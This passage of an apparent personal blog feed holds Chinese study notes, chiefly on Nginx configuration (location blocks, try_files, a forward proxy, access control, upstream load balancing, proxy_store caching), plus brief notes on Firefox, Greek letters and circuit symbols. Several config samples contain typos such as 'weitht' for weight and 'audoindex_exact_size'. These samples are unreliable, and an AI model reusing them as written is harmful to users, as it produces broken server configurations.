    <content type="html"><![CDATA[<p>先来看看这个:<br><img src="/../img/error_404.png" alt="404"></p><p>这个就说明了问题, 没有找到文件, 我们的 <code>nginx.conf</code> 内容如下:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk"> server &#123;<br>       listen          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">82</span>;<br>       server_name     _;<br><br>       root            <span class="hljs-regexp">/var/</span>www/html;<br>       index           <span class="hljs-regexp">/page/i</span>ndex.html;<br><br>       access_log      <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_access.log;<br>       error_log       <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_error.log;<br><br>       location /h3 &#123;<br>          index /h3.html;<br>       &#125;<br><br>       location ~ (h1)|(h2) &#123;<br>          deny all;<br>       &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>虽然设置了 root 目录, 但是并没有其作用.</p><p>重新写一个 <code>location</code> block 来正确导向文件:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"> server &#123;<br>       listen          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">82</span>;<br>       server_name     _;<br><br>       root            <span class="hljs-regexp">/var/</span>www/html;<br>       index           <span class="hljs-regexp">/page/i</span>ndex.html;<br><br>       access_log      <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_access.log;<br>       error_log       <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>default_error.log;<br><br>       location ~* (.*).(js|css) &#123;<br>          root <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>page/;<br>        &#125;<br><br>       location /h3 &#123;<br>          index /h3.html;<br>       &#125;<br><br>       location ~ (h1)|(h2) &#123;<br>          deny all;<br>       &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后就正确显示了:<br><img src="/../img/right.png" alt="right"></p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx-配置中的-try_files</title>
    <link href="/2022/10/05/Nginx-%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84-try_files/"/>
    <url>/2022/10/05/Nginx-%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84-try_files/</url>
    
    <content type="html"><![CDATA[<p>大概格式为:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">try_files</span></span> <span class="hljs-keyword">file</span> ... url;<br></code></pre></td></tr></table></figure><p>这个指令的含义为, 检测 file 是否存在, 打开第一个找到的 file, 如果没有找到一个 file, 那么重定向到最后的 url.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-中关于-Squid</title>
    <link href="/2022/10/04/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Squid/"/>
    <url>/2022/10/04/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Squid/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Squid">ArchWiki</a><br><a href="http://www.squid-cache.org/">官方网站</a></p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>利用-Nginx-搭建正向代理</title>
    <link href="/2022/10/04/%E5%88%A9%E7%94%A8-Nginx-%E6%90%AD%E5%BB%BA%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <url>/2022/10/04/%E5%88%A9%E7%94%A8-Nginx-%E6%90%AD%E5%BB%BA%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/brithToSpring/p/16152403.html">参考</a></p><p>其示例 <code>nginx.conf</code> 部分内容:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>    resolver <span class="hljs-number">114.114</span>.<span class="hljs-number">114.114</span>;       <span class="hljs-comment">#指定DNS服务器IP地址 </span><br>    listen <span class="hljs-number">80</span>;<br>    location / &#123;<br>        proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-variable">$host</span><span class="hljs-variable">$request_uri</span>;     <span class="hljs-comment">#设定代理服务器的协议和地址 </span><br>                proxy_set_header HOST <span class="hljs-variable">$host</span>;<br>                proxy_buffers <span class="hljs-number">256</span> <span class="hljs-number">4</span>k;<br>                proxy_max_temp_file_size <span class="hljs-number">0</span>k;<br>                proxy_connect_timeout <span class="hljs-number">30</span>;<br>                proxy_send_timeout <span class="hljs-number">60</span>;<br>                proxy_read_timeout <span class="hljs-number">60</span>;<br>                proxy_next_upstream error timeout invalid_header http_502;<br>    &#125;<br>&#125;<br>server &#123;<br>    resolver <span class="hljs-number">114.114</span>.<span class="hljs-number">114.114</span>;       <span class="hljs-comment">#指定DNS服务器IP地址 </span><br>    listen <span class="hljs-number">443</span>;<br>    location / &#123;<br>       proxy_pass https:<span class="hljs-regexp">//</span><span class="hljs-variable">$host</span><span class="hljs-variable">$request_uri</span>;    <span class="hljs-comment">#设定代理服务器的协议和地址 </span><br>             proxy_buffers <span class="hljs-number">256</span> <span class="hljs-number">4</span>k;<br>             proxy_max_temp_file_size <span class="hljs-number">0</span>k;<br>       proxy_connect_timeout <span class="hljs-number">30</span>;<br>       proxy_send_timeout <span class="hljs-number">60</span>;<br>       proxy_read_timeout <span class="hljs-number">60</span>;<br>       proxy_next_upstream error timeout invalid_header http_502;<br>    &#125;<br>&#125;<br>[root@localhost ~]<span class="hljs-comment"># /usr/local/nginx-1.12.1/sbin/nginx -s reload</span><br><br></code></pre></td></tr></table></figure><p>主要还是利用 <code>proxy_pass</code> 来转发请求.</p><h1 id="resolver-关键字"><a href="#resolver-关键字" class="headerlink" title="resolver 关键字"></a>resolver 关键字</h1><p><a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#resolver">文档</a><br>用于指定 DNS 服务器.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx-高性能-Web-服务器详解-Notes</title>
    <link href="/2022/10/03/Nginx-%E9%AB%98%E6%80%A7%E8%83%BD-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%A6%E8%A7%A3-Notes/"/>
    <url>/2022/10/03/Nginx-%E9%AB%98%E6%80%A7%E8%83%BD-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%A6%E8%A7%A3-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第3章-Nginx-服务器架构初探"><a href="#第3章-Nginx-服务器架构初探" class="headerlink" title="第3章 Nginx 服务器架构初探"></a>第3章 Nginx 服务器架构初探</h1><h3 id="3-1-2-Nginx-模块化结构"><a href="#3-1-2-Nginx-模块化结构" class="headerlink" title="3.1.2 Nginx 模块化结构"></a>3.1.2 Nginx 模块化结构</h3><p>Nginx 可以通过模块来扩展功能. 就像 vim 装插件.</p><p>一般分为:</p><ul><li>核心模块</li><li>标准 HTTP 模块</li><li>可选 HTTP 模块</li><li>邮件服务模块</li><li>第三方模块</li></ul><p>添加的模块根据实际情况调整.</p><p>核心模块和标准 HTTP 模块在 Nginx 快速编译后就包含在 Nginx 中.</p><p>在我装得 docker 容器 (Ubuntu 18.04) 里, 模块位于 <code>/usr/lib/nginx/modules</code> 这个目录.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在-Linux-下用命令行预览-html-文件</title>
    <link href="/2022/10/03/%E5%9C%A8-Linux-%E4%B8%8B%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%A2%84%E8%A7%88-html-%E6%96%87%E4%BB%B6/"/>
    <url>/2022/10/03/%E5%9C%A8-Linux-%E4%B8%8B%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%A2%84%E8%A7%88-html-%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>用 <code>firefox + file.html</code> 即可:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ firefox test.html<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Greek-alphabets-的读法</title>
    <link href="/2022/10/03/Greek-alphabets-%E7%9A%84%E8%AF%BB%E6%B3%95/"/>
    <url>/2022/10/03/Greek-alphabets-%E7%9A%84%E8%AF%BB%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/greek_alphabet1.png" alt="Greek alphabets"><br><img src="/../img/greek_alphabet2.png" alt="Greek alphabets"></p>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CAD-部分笔记</title>
    <link href="/2022/10/03/CAD-%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/10/03/CAD-%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>CAD 是 Circuit Analysis and Design.</p><h1 id="标识"><a href="#标识" class="headerlink" title="标识"></a>标识</h1><h2 id="电源"><a href="#电源" class="headerlink" title="电源"></a>电源</h2><p><img src="/../img/the_sign_of_source.png" alt="source"></p><p>疑问:</p><ul><li>这个电流电源的箭头表示方向吗, 好像确实是</li><li></li></ul><p>交流电:<br><img src="/../img/ac_source.png" alt="AC source"></p><p>与串联并联结合:<br><img src="/../img/serial_parallel_source.png" alt="serial and parallel"></p><h2 id="Resistor-Inductor-and-Capacitor"><a href="#Resistor-Inductor-and-Capacitor" class="headerlink" title="Resistor, Inductor and Capacitor"></a>Resistor, Inductor and Capacitor</h2><p><img src="/../img/resistor_inductor_capacitor.png" alt="Resistor, Inductor and Capacitor"></p><h2 id="Dependent-Sources"><a href="#Dependent-Sources" class="headerlink" title="Dependent Sources"></a>Dependent Sources</h2><p><img src="/../img/dependent_source.png" alt="dependent_source"></p><h3 id="为什么叫-Dependent-Sources"><a href="#为什么叫-Dependent-Sources" class="headerlink" title="为什么叫 Dependent Sources"></a>为什么叫 Dependent Sources</h3><p>因为它的电压或电流大小取决与电路中的其他电源.</p><h1 id="Dirac-Delta-Function"><a href="#Dirac-Delta-Function" class="headerlink" title="Dirac Delta Function"></a>Dirac Delta Function</h1>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx-高性能-Web-服务器实战教程-Notes</title>
    <link href="/2022/10/02/Nginx-%E9%AB%98%E6%80%A7%E8%83%BD-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9E%E6%88%98%E6%95%99%E7%A8%8B-Notes/"/>
    <url>/2022/10/02/Nginx-%E9%AB%98%E6%80%A7%E8%83%BD-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9E%E6%88%98%E6%95%99%E7%A8%8B-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第4章-Nginx-基本配置"><a href="#第4章-Nginx-基本配置" class="headerlink" title="第4章 Nginx 基本配置"></a>第4章 Nginx 基本配置</h1><p>Nginx 所有功能的实现, 都是通过配置文件的设置完成的.</p><p><code>#</code> 是注释符.</p><h3 id="4-1-2-设置用户和组"><a href="#4-1-2-设置用户和组" class="headerlink" title="4.1.2 设置用户和组"></a>4.1.2 设置用户和组</h3><h3 id="4-1-3-自定义错误页"><a href="#4-1-3-自定义错误页" class="headerlink" title="4.1.3 自定义错误页"></a>4.1.3 自定义错误页</h3><h4 id="1-为每种类型的错误设置单独的处理方式"><a href="#1-为每种类型的错误设置单独的处理方式" class="headerlink" title="1. 为每种类型的错误设置单独的处理方式"></a>1. 为每种类型的错误设置单独的处理方式</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">error_page</span> <span class="hljs-number">403</span> /<span class="hljs-number">40</span>x.html;<br><span class="hljs-attribute">error_page</span> <span class="hljs-number">404</span> /<span class="hljs-number">404</span>.jpg;<br></code></pre></td></tr></table></figure><h4 id="2-利用在线资源进行错误处理"><a href="#2-利用在线资源进行错误处理" class="headerlink" title="2. 利用在线资源进行错误处理"></a>2. 利用在线资源进行错误处理</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">error_page <span class="hljs-number">403</span> http:<span class="hljs-regexp">//</span>example.com/forbidden.html;<br></code></pre></td></tr></table></figure><h4 id="更改响应状态码"><a href="#更改响应状态码" class="headerlink" title="更改响应状态码"></a>更改响应状态码</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">error_page</span> <span class="hljs-number">403</span>=<span class="hljs-number">200</span> /<span class="hljs-number">40</span>x.html;<br></code></pre></td></tr></table></figure><h2 id="4-2-访问控制"><a href="#4-2-访问控制" class="headerlink" title="4.2 访问控制"></a>4.2 访问控制</h2><h3 id="4-2-1-权限控制指令"><a href="#4-2-1-权限控制指令" class="headerlink" title="4.2.1 权限控制指令"></a>4.2.1 权限控制指令</h3><p>两个用于配置访问权限的指令:</p><ul><li>allow</li><li>deny<br>指令后接 IP, IP 段或 all.</li></ul><p>在内层中的设置优先级更高. 在同一个块中, 先出现的优先级更高.</p><p>所以这个权限控制一般放在模块的最后.</p><p>如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">allow</span> <span class="hljs-number">192.168.78.128</span>;<br><span class="hljs-attribute">deny</span> <span class="hljs-literal">all</span>;<br></code></pre></td></tr></table></figure><h3 id="4-2-2-访问控制典型应用"><a href="#4-2-2-访问控制典型应用" class="headerlink" title="4.2.2 访问控制典型应用"></a>4.2.2 访问控制典型应用</h3><p>对于网站下的 admin 目录仅允许管理员身份的用户访问.</p><p>location 块的前缀:<br><img src="/../img/prefix_of_location_block.png" alt="location 块的前缀"></p><p>location 块是, 匹配成功了之后就执行后面的代码块.</p><p>如:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">/admin</span>/auth &#123;<br>    allow <span class="hljs-number">192.168</span>.<span class="hljs-number">78.200</span>;<br>&#125;<br><span class="hljs-keyword">deny</span> all;<br></code></pre></td></tr></table></figure><h4 id="3-最大前缀匹配"><a href="#3-最大前缀匹配" class="headerlink" title="3. 最大前缀匹配"></a>3. 最大前缀匹配</h4><p>普通的 location 之间遵循 “最大前缀匹配原则”, 匹配度最高的 location 将会执行.</p><h2 id="4-3-日志文件"><a href="#4-3-日志文件" class="headerlink" title="4.3 日志文件"></a>4.3 日志文件</h2><p>Nginx 可以使每个块的配置拥有各自独立的日志进行记录.</p><p>可以分为:</p><ul><li>访问日志</li><li>错误日志</li></ul><h2 id="4-4-虚拟主机"><a href="#4-4-虚拟主机" class="headerlink" title="4.4 虚拟主机"></a>4.4 虚拟主机</h2><h3 id="4-4-2-基于端口号配置虚拟主机"><a href="#4-4-2-基于端口号配置虚拟主机" class="headerlink" title="4.4.2 基于端口号配置虚拟主机"></a>4.4.2 基于端口号配置虚拟主机</h3><p>一个 Nginx 监听多个端口, 根据不同的端口号, 来区分不同的网站.</p><p>若要在 Nginx 中配置一个虚拟主机, 只需在 http 块中添加一个 server 块即可. 也就是说, http 块中的每个 server 块都是一个虚拟主机.</p><p><code>server_name</code> 指令中也可以使用通配符 (<code>*</code>)与正则表达式来设置域名:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">server_name</span> <span class="hljs-regexp">*.test.com</span>;<br></code></pre></td></tr></table></figure><h3 id="4-4-5-设置目录列表"><a href="#4-4-5-设置目录列表" class="headerlink" title="4.4.5 设置目录列表"></a>4.4.5 设置目录列表</h3><p>Nginx 默认是不允许列出整个目录的.</p><p>开启目录列表功能后, 可以让该站点或目录下的文件以列表的形式展示.</p><p>开启:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><p>在 http 块中, 表示对于所有站点都有效, 在 server 块中, 表示对指定站点有效, 在 location 块中, 表示对某个目录起作用.</p><h4 id="显示文件的时间格式与大小"><a href="#显示文件的时间格式与大小" class="headerlink" title="显示文件的时间格式与大小"></a>显示文件的时间格式与大小</h4><p><code>audoindex_exact_size</code> 指令设置精确显示文件大小还是大概显示文件大小. </p><p><code>autoindex_localtime</code> 指令设置文件最后一次修改时间的格式.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">autoindex_exact_size</span> <span class="hljs-literal">off</span>; <span class="hljs-comment"># 以 KB/MB/GB 显示</span><br><span class="hljs-attribute">autoindex_localtime</span>  <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><h3 id="4-4-6-子配置文件的引入"><a href="#4-4-6-子配置文件的引入" class="headerlink" title="4.4.6 子配置文件的引入"></a>4.4.6 子配置文件的引入</h3><h1 id="第6章-负载均衡与缓存"><a href="#第6章-负载均衡与缓存" class="headerlink" title="第6章 负载均衡与缓存"></a>第6章 负载均衡与缓存</h1><h3 id="6-1-1-代理与反向代理"><a href="#6-1-1-代理与反向代理" class="headerlink" title="6.1.1 代理与反向代理"></a>6.1.1 代理与反向代理</h3><p>平时直接的称代理就是正向代理.</p><p>正向代理, 你还是直接向目标服务器发起请求, 只不过这个请求要先到达代理服务器.</p><p>反向代理, 你是直接向反向代理服务器发起请求.</p><h3 id="6-1-2-反向代理服务配置"><a href="#6-1-2-反向代理服务配置" class="headerlink" title="6.1.2 反向代理服务配置"></a>6.1.2 反向代理服务配置</h3><p>Nginx 服务器中, 反向代理的配置主要用 <code>proxy_pass</code> 指令. (直观看这两个单词, proxy 是代理, pass 是传递, 就是将反向代理服务器收到的请求转移给后方真正存储资源的服务器)</p><h2 id="6-2-负载均衡"><a href="#6-2-负载均衡" class="headerlink" title="6.2 负载均衡"></a>6.2 负载均衡</h2><h3 id="6-2-2-负载均衡的配置"><a href="#6-2-2-负载均衡的配置" class="headerlink" title="6.2.2 负载均衡的配置"></a>6.2.2 负载均衡的配置</h3><p>通过 Nginx 中的 upstream 指令.</p><p>有四种实现负载均衡的方式:<br><img src="/../img/upstream.png" alt="负载均衡"></p><p>在 upstream 指定的服务器组中, 若每个服务器的权重都设置为 1 (默认值) 时, 表示当前的负载均衡是一般轮循方式.</p><p><code>upstream</code> 指令指定的服务器用于其前面的 <code>proxy_pass</code> 所指定的服务器.</p><p>如:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>      <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> test.com;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://web_server;<br>    &#125;<br>&#125;<br><br><span class="hljs-section">upstream</span> web_server &#123;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.128</span>;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.200</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是说, <code>/</code> 即任意请求, 或被 pass 到 <code>http://web_server</code>, 而 <code>http://web_server</code> 又是由两个 server 组成.</p><h4 id="2-加权轮循"><a href="#2-加权轮循" class="headerlink" title="2. 加权轮循"></a>2. 加权轮循</h4><p>使用 <code>weight</code> 参数设置权重大小:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">upstream web_server &#123;<br>   <span class="hljs-built_in"> server </span>192.168.78.128 <span class="hljs-attribute">weitht</span>=1;<br>   <span class="hljs-built_in"> server </span>192.168.78.200 <span class="hljs-attribute">weitht</span>=3;<br>&#125;<br></code></pre></td></tr></table></figure><p>其他状态参数:<br><img src="/../img/state_args.png" alt="state_args"></p><p>设置为 <code>backup</code> 的服务器, 只有当其他所有的非 <code>backup</code> 机器出现故障或者忙碌的情况下, 才会请求 <code>backup</code> 服务器.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> web_server &#123;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.128</span> weitht=<span class="hljs-number">1</span>;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.200</span> weitht=<span class="hljs-number">3</span>;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.201</span> backup;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-ip-hash-负载均衡"><a href="#3-ip-hash-负载均衡" class="headerlink" title="3. ip_hash 负载均衡"></a>3. <code>ip_hash</code> 负载均衡</h4><p>将每个请求按照访问 IP 的 hash 结果分配, 使得来自同一个 IP 的客户端固定访问一台 Web 服务器. 解决动态网页存在的 Session 共享问题.</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">upstream web_server &#123;<br>    ip_hash<span class="hljs-comment">;</span><br>    server <span class="hljs-number">192.168</span>.<span class="hljs-number">78.128</span><span class="hljs-comment">;</span><br>    server <span class="hljs-number">192.168</span>.<span class="hljs-number">78.200</span><span class="hljs-comment">;</span><br>    server <span class="hljs-number">192.168</span>.<span class="hljs-number">78.201</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>使用 <code>ip_hash</code> 方式处理负载均衡时, Web 服务器在负载均衡列表中的状态不能使用 weight 和 backup 设置.</p><h4 id="4-利用第三方模块"><a href="#4-利用第三方模块" class="headerlink" title="4. 利用第三方模块"></a>4. 利用第三方模块</h4><h2 id="6-3-缓存配置"><a href="#6-3-缓存配置" class="headerlink" title="6.3 缓存配置"></a>6.3 缓存配置</h2><h3 id="6-3-2-永久缓存配置"><a href="#6-3-2-永久缓存配置" class="headerlink" title="6.3.2 永久缓存配置"></a>6.3.2 永久缓存配置</h3><p>Nginx 提供的 <code>proxy_store</code> 指令可以用于将内容源服务器响应的内容缓存到本地, 若不手动删除, 该缓存文件会一直生效.</p><p>如:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>      <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> <span class="hljs-number">192.168.78.3</span>;<br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">root</span> cache; <br>        <span class="hljs-attribute">proxy_store</span> <span class="hljs-literal">on</span>;                             <span class="hljs-comment"># 开启本地缓存</span><br>        <span class="hljs-attribute">proxy_store_access</span> user:rw group:rw all:r;  <span class="hljs-comment"># 设置读写权限</span><br>        <span class="hljs-attribute">proxy_temp_path</span> cache_tmp;                  <span class="hljs-comment"># 设置临时目录</span><br>        <span class="hljs-attribute">if</span> (!-e <span class="hljs-variable">$request_filename</span>) &#123;<br>            <span class="hljs-attribute">proxy_pass</span> http://192.168.78.128;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>cache</code> 这个目录的权限要与 Nginx 工作进程 (<code>worker_process</code>)相同.</p><h3 id="6-3-3-临时缓存配置"><a href="#6-3-3-临时缓存配置" class="headerlink" title="6.3.3 临时缓存配置"></a>6.3.3 临时缓存配置</h3><h3 id="6-3-4-缓存清理配置"><a href="#6-3-4-缓存清理配置" class="headerlink" title="6.3.4 缓存清理配置"></a>6.3.4 缓存清理配置</h3><h2 id="6-4-邮件服务"><a href="#6-4-邮件服务" class="headerlink" title="6.4 邮件服务"></a>6.4 邮件服务</h2><h1 id="第7章-模块配置应用"><a href="#第7章-模块配置应用" class="headerlink" title="第7章 模块配置应用"></a>第7章 模块配置应用</h1><h2 id="7-1-模块概述"><a href="#7-1-模块概述" class="headerlink" title="7.1 模块概述"></a>7.1 模块概述</h2><h3 id="7-1-1-模块化结构设计"><a href="#7-1-1-模块化结构设计" class="headerlink" title="7.1.1 模块化结构设计"></a>7.1.1 模块化结构设计</h3><h3 id="7-1-2-Nginx-模块分类及应用"><a href="#7-1-2-Nginx-模块分类及应用" class="headerlink" title="7.1.2 Nginx 模块分类及应用"></a>7.1.2 Nginx 模块分类及应用</h3><p>通常将 Nginx 分为 5 大模块, 分别为:</p><ul><li>核心模块</li><li>标准 HTTP 模块</li><li>可选 HTTP 模块 </li><li>邮件服务模块</li><li>第三方模块</li></ul><p>核心模块是 Nginx 服务器正常运行必不可少的模块, 如同操作系统的内核. 它提供了 Nginx 最基本的 核心服务.</p><p>标准 HTTP 模块用于支持标准 HTTP 的相关功能, 是编译 Nginx 时默认安装的模块.</p><p>可选 HTTP 模块主要用于扩展 HTTP 功能.</p><p>邮件服务模块主要用于支持邮件服务.</p><p>第三方模块是为了扩展 Nginx 的应用.</p><p>Nginx 的模块命名规则, 是以 <code>ngx_</code> 开头, 以 <code>_module</code> 结尾.</p><p>如 <code>ngx_core_module</code> 表示该模块提供的是 Nginx 的核心功能.</p><h3 id="7-1-3-Nginx-手册的使用"><a href="#7-1-3-Nginx-手册的使用" class="headerlink" title="7.1.3 Nginx 手册的使用"></a>7.1.3 Nginx 手册的使用</h3><p>上 <a href="http://nginx.org/en/docs/">官网</a>, Modules reference 中提供了 Nginx 所有模块以及指令的使用.</p><p>在指令或变量名称的后面, 若标注了具体的模块名称, 即表示该指令或变量只能在此模块下使用, 未标注的则表示通用指令和变量.</p><h2 id="7-2-调试输出"><a href="#7-2-调试输出" class="headerlink" title="7.2 调试输出"></a>7.2 调试输出</h2><h3 id="7-2-1-调试输出的配置"><a href="#7-2-1-调试输出的配置" class="headerlink" title="7.2.1 调试输出的配置"></a>7.2.1 调试输出的配置</h3><p>使用 <code>echo-nginx-module</code> 这个第三方模块.</p><p>下载, 具体查看 <a href="https://github.com/openresty/echo-nginx-module#installation">github 上的相关部分</a></p><h4 id="1-查看当前-Nginx-版本及其编译选项"><a href="#1-查看当前-Nginx-版本及其编译选项" class="headerlink" title="1. 查看当前 Nginx 版本及其编译选项"></a>1. 查看当前 Nginx 版本及其编译选项</h4><figure class="highlight sh"><table><tr><td 